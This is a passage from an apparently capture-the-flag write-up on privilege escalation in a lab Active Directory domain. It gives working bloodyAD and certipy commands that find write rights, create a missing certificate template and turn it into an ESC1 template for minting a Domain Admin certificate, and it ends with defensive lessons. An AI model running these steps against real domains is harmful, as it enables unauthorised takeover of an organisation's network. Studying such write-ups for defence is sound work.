3. Privilege Escalation

AD CS — Create Missing ESC1 Template

jake.h is Template Editor / DevOps PKI: can CREATE_CHILD under Certificate Templates and OID containers, but several published template names have no objects.

bloodyAD -H dc.danglingtree.htb -i <target-ip> \
  -d danglingtree.htb -u jake.h -p 'Admin@123' \
  -s get writable --partition CONFIGURATION --right CHILD --detail

# CREATE_CHILD on CN=Certificate Templates and CN=OID

Create EmployeeAuthTemplate (OID + template object), then configure as ESC1:

python3 create_template.py \
  -H dc.danglingtree.htb \
  -u 'jake.h@danglingtree.htb' \
  -p 'Admin@123' \
  -t EmployeeAuthTemplate

certipy template \
  -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
  -dc-ip <target-ip> -dc-host dc.danglingtree.htb \
  -template EmployeeAuthTemplate \
  -write-default-configuration S-1-5-11 \
  -no-save -force

certipy find \
  -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
  -dc-ip <target-ip> -dc-host dc.danglingtree.htb \
  -vulnerable
# ESC1 / ESC15 / ESC4

✅ Lessons Learned Guest-readable assessment PDFs are free creds. Hardcoded crypto in service binaries plus RunasCs closed the gap to interactive users. DPAPI on a workstation credential bag yielded lateral movement; Support-IT force-change handed Template Editor rights. Published CA template names without matching objects let an attacker create an ESC1 template and mint a Domain Admin certificate. Audit guest shares, protect DPAPI secrets, and ensure published templates exist with locked-down enrollment ACLs.
